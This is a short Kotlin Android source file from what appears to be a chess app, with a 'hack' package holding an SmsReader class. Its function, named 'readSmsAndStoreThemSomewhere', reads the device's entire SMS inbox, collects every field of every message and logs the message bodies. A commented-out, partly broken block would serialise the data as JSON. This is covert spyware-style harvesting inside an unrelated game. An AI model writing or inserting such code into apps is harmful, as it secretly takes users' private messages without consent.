package com.esgi.davidlinhares.chess.hack

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log
import kotlin.system.measureTimeMillis

class SmsReader {
    companion object {
        fun readSmsAndStoreThemSomewhere(ctx: Context){
            val cursor = ctx.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
            val messages = mutableListOf<MutableList<Pair<String, String>>>()
            cursor?.let {
                if (cursor.moveToFirst()) {
                    do {
                        var msgData = ""
                        for (i in 0 until cursor.columnCount) {
                            msgData = "$msgData${cursor.getColumnName(i)}////${cursor.getString(i)};;;;"
                        }
                        val msg = msgData.split(";;;;")
                        val oneMsgList = mutableListOf<Pair<String, String>>()
                        msg.forEach {oneMsgData ->
                            val m = oneMsgData.split("////")
                            if (m.size == 2)
                                oneMsgList.add(Pair(m[0], m[1]))


                        }
                        messages.add(oneMsgList)
                    }while (cursor.moveToNext())
                }

            }
            cursor?.close()

            Log.d("COUCOU", messages.getMessageBody().toString())
//            var jsonString = "{"
//            val i = 0

//            val time = measureTimeMillis {
//                messages.forEach { msgData ->
//                    jsonString = "$jsonString \"$i\":{"
//                    msgData.forEach {
//                        jsonString = "$jsonString \"${it.first}\":\"${it.second}\","
//                    }
//                    jsonString.removeRange(IntRange(jsonString.length - 2, jsonString.length - 1))
//                    jsonString = "$jsonString },"
//                }
//
//                jsonString.removeRange(IntRange(jsonString.length - 1, jsonString.length))
//                jsonString = "$jsonString }"
//            }
//            Log.d("JSONSTRING", "elapsed time : $time")
//            Log.d("JSONSTRING", jsonString)
        }
    }
}

fun MutableList<MutableList<Pair<String, String>>>.getMessageBody(): MutableList<String> {
    val result = mutableListOf<String>()
    this.forEach {
        it.forEach {
            if (it.first == "body")
                result.add(it.second)
        }
    }
    return result
}